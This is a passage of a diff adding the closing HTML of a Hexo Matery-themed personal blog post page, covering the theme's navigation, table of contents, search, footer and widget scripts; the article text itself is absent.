+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web/" class="post-category">
+                                    web
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/">
+                        <span class="chip bg-color">正则绕过</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Marmalade&#39;s Blog<br />'
+            + '文章作者: lijunliang<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('1'),
+            headingSelector: 'h1, h2, h3, h4, h5, h6'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4, h5, h6').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="2182100384"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2020-2021</span>
+            
+            <span id="year">2020</span>
+            <a href="/about" target="_blank">lijunliang</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">70.1k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv" style='display:none'>
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;本站总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv" style='display:none'>
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "2";
+                    var startDate = "10";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+            <img src="/medias/beian.png">
+                <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=37110202000277"  style="color:#f72b07" target="_blank">鲁公网安备37110202000277号</a>
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/marmalade0" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1563972718@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1563972718" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1563972718" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+
+
+    <a href="https://blog.csdn.net/kuashijidexibao" class="tooltipped" target="_blank" data-tooltip="关注我的CSDN: https://blog.csdn.net/kuashijidexibao" data-position="top" data-delay="50">
+        <i class="fab fa-csdn">C</i>
+    </a>
+
+
+
+    <a href="https://cdn.jsdelivr.net/gh/guixinchn/image/blog/wechat.jpg" class="tooltipped" target="_blank" data-tooltip="微信联系我: https://cdn.jsdelivr.net/gh/guixinchn/image/blog/wechat.jpg" data-position="top" data-delay="50">
+        <i class="fab fa-weixin"></i>
+    </a>
+
+
+
+    <a href="https://space.bilibili.com/446853801" class="tooltipped" target="_blank" data-tooltip="在B站上关注我" " data-position="top" data-delay="50">
+        <i class="fas fa-play-circle"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
